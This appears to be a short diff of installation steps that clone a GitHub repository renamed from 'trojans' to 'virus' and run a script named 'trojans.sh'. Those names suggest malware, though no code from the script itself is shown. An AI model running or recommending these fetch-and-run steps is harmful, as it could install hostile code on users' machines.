@@ -5,8 +5,8 @@ apt upgrade
 
 pip2 install requests
 
-git clone https://github.com/SadBoy8199299/trojans
+git clone https://github.com/SadBoy8199299/virus
 
-cd trojans
+cd virus
 
-Bash trojans.sh
+bash trojans.sh
